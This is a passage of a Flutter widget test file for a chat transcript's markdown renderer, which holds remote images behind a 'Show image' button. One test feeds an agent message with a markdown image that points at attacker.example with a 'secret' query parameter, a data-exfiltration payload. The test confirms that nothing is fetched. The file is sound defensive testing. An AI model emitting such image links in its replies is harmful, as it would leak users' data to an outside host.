    expect(CodeLabMarkdownStats.imagePlaceholderBuilds, builds);
  });

  testWidgets('markdown image is not fetched before user action', (
    tester,
  ) async {
    debugNetworkImageHttpClientProvider = _ForbiddenHttpClient.new;
    try {
      await tester.pumpWidget(
        _host(
          withPolicy(
            const CodeLabMarkdown(
              id: 'agent-1',
              text:
                  '![](https://attacker.example/?d=secret)\n\n'
                  '![p](https://x.example/p.svg)',
            ),
          ),
        ),
      );
      await tester.pump();
      await tester.pump(const Duration(milliseconds: 100));

      // Сеть и `imageFor` не тронуты (tearDown проверяет запросы): только
      // заглушки с хостом и кнопкой «Show image».
      expect(imageRequests, isEmpty);
      expect(find.byType(Image), findsNothing);
      expect(find.byType(CodeLabImagePlaceholder), findsNWidgets(2));
      expect(find.text('Show image'), findsNWidgets(2));
      expect(
        find.textContaining('attacker.example', findRichText: true),
        findsOneWidget,
      );
      expect(
        find.textContaining('x.example', findRichText: true),
        findsOneWidget,
      );
    } finally {
      debugNetworkImageHttpClientProvider = null;
    }
  });

  testWidgets('show image loads the picture once and shows it', (tester) async {
    await tester.pumpWidget(
      _host(
        withPolicy(
          const CodeLabMarkdown(
            id: 'agent-1',
            text: '![](https://x.example/y.png)',
          ),
        ),
      ),
    );
    await tester.pump();
    expect(find.byType(Image), findsNothing);

    await tester.tap(find.text('Show image'));
    // Таймер двойного клика `SelectableRegion` должен истечь до конца теста.
    await tester.pump(const Duration(seconds: 1));

    // Ключ выбора — строка и адрес (D6); картинка запрошена у app один раз и
    // показана вместо заглушки.
    expect(shown.value, {'agent-1#image:https://x.example/y.png'});
    expect(imageRequests, [Uri.parse('https://x.example/y.png')]);
    expect(find.byType(Image), findsOneWidget);
    expect(tester.widget<Image>(find.byType(Image)).image, same(image));
    expect(find.text('Show image'), findsNothing);
  });

  testWidgets('a shown image survives the row leaving the screen', (
    tester,
  ) async {
    tester.view.physicalSize = const Size(700, 500);
    tester.view.devicePixelRatio = 1;
    addTearDown(tester.view.resetPhysicalSize);
    addTearDown(tester.view.resetDevicePixelRatio);
    final rows = [
      const CodeLabAgentTextRow(
        id: 'agent-1',
        text: '![](https://x.example/y.png)',
      ),
      for (var i = 0; i < 60; i++)
        CodeLabUserRow(id: 'prompt-${i + 2}', text: 'filler line number $i'),
    ];
    await tester.pumpWidget(
      FluentApp(home: withPolicy(CodeLabTranscriptPanel(rows: rows))),
    );
    await tester.pump();

    await tester.tap(find.text('Show image'));
    // Таймер двойного клика `SelectableRegion` должен истечь до конца теста.
    await tester.pump(const Duration(seconds: 1));
    expect(find.byType(Image), findsOneWidget);

    // Строка уходит с экрана и уничтожается лентой.
    await tester.drag(find.byType(Scrollable).first, const Offset(0, -6000));
    await tester.pump();
    expect(find.byType(Image), findsNothing);
    expect(find.text('filler line number 59'), findsOneWidget);

    // И возвращается: выбор пользователя жив, повторного клика не нужно.
    await tester.drag(find.byType(Scrollable).first, const Offset(0, 6000));
    await tester.pump();
    await tester.pump();
    expect(find.byType(Image), findsOneWidget);
    expect(find.text('Show image'), findsNothing);
    expect(shown.value, {'agent-1#image:https://x.example/y.png'});
  });

  testWidgets('showing an image does not rebuild closed blocks (DSK-3)', (
    tester,
  ) async {
    await tester.pumpWidget(
      _host(
        withPolicy(
          const CodeLabMarkdown(
            id: 'agent-1',
            text:
                '# Title\n\nIntro.\n\n```dart\nfinal a = 1;\n```\n\n'
                '![](https://x.example/y.png)\n\nOutro.',
          ),
        ),
      ),
    );
    await tester.pump();
    final blocks = Map.of(CodeLabMarkdownStats.codeBlockBuilds);
    final headings = Map.of(CodeLabMarkdownStats.headingBuilds);
    final mounts = Map.of(CodeLabMarkdownStats.codeBlockMounts);
    expect(blocks, isNotEmpty);

    await tester.tap(find.text('Show image'));
    await tester.pump(const Duration(seconds: 1));

    expect(find.byType(Image), findsOneWidget);
    expect(CodeLabMarkdownStats.codeBlockBuilds, blocks);
    expect(CodeLabMarkdownStats.headingBuilds, headings);
    expect(CodeLabMarkdownStats.codeBlockMounts, mounts);
  });

  testWidgets('an image that fails to load falls back to the placeholder', (
    tester,
  ) async {
    image = MemoryImage(Uint8List.fromList([1, 2, 3]));
    await tester.pumpWidget(
      _host(
        withPolicy(
          const CodeLabMarkdown(
            id: 'agent-1',
            text: '![](https://x.example/y.png)',
          ),
        ),
      ),
    );
    await tester.pump();
    await tester.tap(find.text('Show image'));
    await tester.pump(const Duration(seconds: 1));
    await tester.runAsync(
      () => Future<void>.delayed(const Duration(milliseconds: 200)),
    );
    await tester.pump();
    await tester.pump();

    expect(tester.takeException(), isNull);
    expect(find.byType(CodeLabImagePlaceholder), findsOneWidget);
    expect(
      find.textContaining('x.example', findRichText: true),
      findsOneWidget,
    );
  });

  // ---- Вид показанной картинки (smoke macOS, итерация 4) ----

  Future<ui.Image> makeImage(WidgetTester tester, int w, int h) async {
    final image = await tester.runAsync(() async {
      final recorder = ui.PictureRecorder();
      Canvas(recorder).drawRect(
        Rect.fromLTWH(0, 0, w.toDouble(), h.toDouble()),
        Paint()..color = const Color(0xFF3366CC),
      );
      return recorder.endRecording().toImage(w, h);
    });
    return image!;
  }

  Future<void> showSizedImage(
    WidgetTester tester,
    ui.Image source, {
    String text = 'Picture: ![](https://x.example/y.png)',
  }) async {
    image = _StaticImage(source);
    await tester.pumpWidget(
      _host(withPolicy(CodeLabMarkdown(id: 'agent-1', text: text))),
    );
    await tester.pump();
    await tester.tap(find.text('Show image'));
    await tester.pump(const Duration(seconds: 1));
  }

  testWidgets('a loading image shows the placeholder and a small spinner', (
    tester,
  ) async {
    final loaded = Completer<ImageInfo>();
    image = _PendingImage(loaded.future);
    await tester.pumpWidget(
      _host(
        withPolicy(
          const CodeLabMarkdown(
            id: 'agent-1',
            text: '![](https://x.example/y.png)',
          ),
        ),
      ),
    );
    await tester.pump();
    await tester.tap(find.text('Show image'));
    await tester.pump(const Duration(seconds: 1));

    // До первого кадра: заглушка с хостом и имя файла, индикатор, кнопки нет.
    expect(find.byType(ProgressRing), findsOneWidget);
    expect(
      find.textContaining('x.example · y.png', findRichText: true),
      findsOneWidget,
    );
    expect(find.text('Show image'), findsNothing);

    final source = await makeImage(tester, 40, 30);
    loaded.complete(ImageInfo(image: source));
    await tester.pump();
    await tester.pump();

    expect(find.byType(ProgressRing), findsNothing);
    expect(
      find.textContaining('x.example · y.png', findRichText: true),
      findsNothing,
    );
    expect(find.byType(Image), findsOneWidget);
  });

  testWidgets('a shown image takes its own line below the text', (
    tester,
  ) async {
    await showSizedImage(tester, await makeImage(tester, 200, 300));

    final paragraph = find.byWidgetPredicate(
      (w) => w is RichText && w.text.toPlainText().contains('Picture:'),
    );
    final render = tester.renderObject<RenderParagraph>(paragraph.first);
    final boxes = render.getBoxesForSelection(
      const TextSelection(baseOffset: 0, extentOffset: 8),
    );
    final textBottom = render.localToGlobal(boxes.last.toRect().bottomLeft).dy;
    final imageTop = tester.getRect(find.byType(Image)).top;

    // Без своей строки подпись прижималась бы к низу высокой картинки.
    expect(imageTop, greaterThanOrEqualTo(textBottom - 0.5));
  });

  testWidgets('a small image is not enlarged', (tester) async {
    await showSizedImage(tester, await makeImage(tester, 64, 64));

    final size = tester.getSize(find.byType(Image));
    expect(size.width, lessThanOrEqualTo(64));
    expect(size.height, lessThanOrEqualTo(64));
  });

  testWidgets('a large image stays within the paragraph width and 480 px', (
    tester,
  ) async {
    await showSizedImage(tester, await makeImage(tester, 2000, 1000));

    final size = tester.getSize(find.byType(Image));
    expect(size.width, lessThanOrEqualTo(600));
    expect(size.height, lessThanOrEqualTo(480));
    expect(size.width / size.height, closeTo(2, 0.01));
  });

  testWidgets('a tall image is cut at 480 px', (tester) async {
    await showSizedImage(tester, await makeImage(tester, 300, 3000));

    expect(tester.getSize(find.byType(Image)).height, lessThanOrEqualTo(480));
  });

  testWidgets('a shown image does not open the same url in another answer', (
    tester,
  ) async {
    shown.value = {'agent-1#image:https://x.example/y.png'};
    await tester.pumpWidget(
      _host(
        withPolicy(
          Column(
            children: const [
              CodeLabMarkdown(
                id: 'agent-1',
                text: '![](https://x.example/y.png)',
              ),
              CodeLabMarkdown(
                id: 'agent-3',
                text: '![](https://x.example/y.png)',
              ),
            ],
          ),
        ),
      ),
    );
    await tester.pump();

    expect(find.byType(Image), findsOneWidget);
    expect(find.text('Show image'), findsOneWidget);
  });

  testWidgets('http and data images are placeholders without Show image', (
    tester,
  ) async {
    await tester.pumpWidget(
      _host(
        withPolicy(
          const CodeLabMarkdown(
            id: 'agent-1',
            text:
                '![a](http://x.example/y.png)\n\n'
                '![b](data:image/png;base64,AAAA)',
          ),
        ),
      ),
    );
    await tester.pump();

    expect(find.byType(CodeLabImagePlaceholder), findsNWidgets(2));
    expect(find.text('Show image'), findsNothing);
    expect(find.byType(Image), findsNothing);
    expect(imageRequests, isEmpty);
  });

  testWidgets('without a scope images have no Show image button', (
    tester,
  ) async {
    await tester.pumpWidget(
      _host(
        const CodeLabMarkdown(
          id: 'agent-1',
          text: '![](https://x.example/y.png)',
        ),
      ),
    );
    await tester.pump();

    expect(find.byType(CodeLabImagePlaceholder), findsOneWidget);
    expect(find.text('Show image'), findsNothing);
  });
}
